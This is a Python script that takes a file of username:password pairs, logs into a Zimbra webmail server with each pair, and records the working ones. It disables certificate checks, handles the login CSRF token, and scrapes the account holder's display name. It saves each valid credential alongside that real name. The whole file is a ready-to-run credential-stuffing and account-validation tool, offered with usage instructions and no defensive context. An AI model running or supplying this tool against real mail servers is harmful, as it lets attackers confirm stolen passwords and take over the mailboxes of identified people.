import requests
from bs4 import BeautifulSoup
import sys
import urllib3
import re
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_user_display_name(zimbra_url, login, password):
    session = requests.Session()

    try:
        response = session.get(zimbra_url, timeout=10, verify=False)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error loading the page: {e}")
        return None

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token_tag = soup.find('input', {'name': 'login_csrf'})

    if not csrf_token_tag:
        print("[-] The CSRF token could not be found on the page.")
        return None

    csrf_token = csrf_token_tag.get('value')

    login_payload = {
        'login_csrf': csrf_token,
        'username': login,
        'password': password,
        'client': 'preferred',
        'loginOp': 'login'
    }

    try:
        response = session.post(zimbra_url, data=login_payload, timeout=10, allow_redirects=True, verify=False)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error when trying to log in: {e}")
        return None

    if "Invalid username or password" in response.text:
        print(f"[-] For {login}: Invalid credentials.")
        return None

    try:
        response = session.get(zimbra_url, timeout=10, verify=False)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error loading the main page: {e}")
        return None

    soup = BeautifulSoup(response.text, 'html.parser')

    scripts = soup.find_all('script')
    display_name = None

    for script in scripts:
        if script.string and 'batchInfoResponse' in script.string:
            script_content = script.string

            match = re.search(r'var batchInfoResponse = (\{.*?\});', script_content, re.DOTALL)
            if match:
                json_str = match.group(1)
                try:
                    data = json.loads(json_str)

                    display_name = data['Body']['BatchResponse']['GetInfoResponse'][0]['attrs']['_attrs']['displayName']
                    return display_name

                except (json.JSONDecodeError, KeyError):
                    try:
                        name_match = re.search(r'"displayName":"([^"]+)"', script_content)
                        if name_match:
                            display_name = name_match.group(1)
                            return display_name
                    except Exception:
                        continue

    username_div = soup.find('div', {'id': 'z_userName'})
    if username_div:
        return username_div.text.strip()

    username_span = soup.find('span', {'id': 'skin_container_username'})
    if username_span:
        return username_span.text.strip()

    return None

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <Zimbra_URL> <file_with_creds> <output_file>")
        print("Example: python3 script.py https://zimbra.example.com/ creds.txt results.txt")
        sys.exit(1)

    zimbra_url = sys.argv[1]
    creds_file = sys.argv[2]
    output_file = sys.argv[3]

    try:
        with open(creds_file, 'r', encoding='utf-8') as f:
            credentials = [line.strip().split(':', 1) for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File '{creds_file}' not found.")
        sys.exit(1)

    print(f"[+] Found {len(credentials)} credentials.")
    print(f"[+] Target: {zimbra_url}")
    print("-" * 50)

    results = []
    for cred in credentials:
        if len(cred) != 2:
            print(f"[!] Skipping the line with the error: {' '.join(cred)}")
            continue

        login, password = cred
        print(f"[?] Check: {login}")

        name = get_user_display_name(zimbra_url, login, password)
        if name:
            result_line = f"{login}:{password} - {name}"
            print(f"[+] SUCCESS: {result_line}")
            results.append(result_line)
        else:
            print(f"[-] Couldn't get full name for {login}")

    if results:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(results))
        print(f"\n[+] Ready! The results are saved in '{output_file}'.")
    else:
        print(f"\n[-] Couldn't get full name for any account.")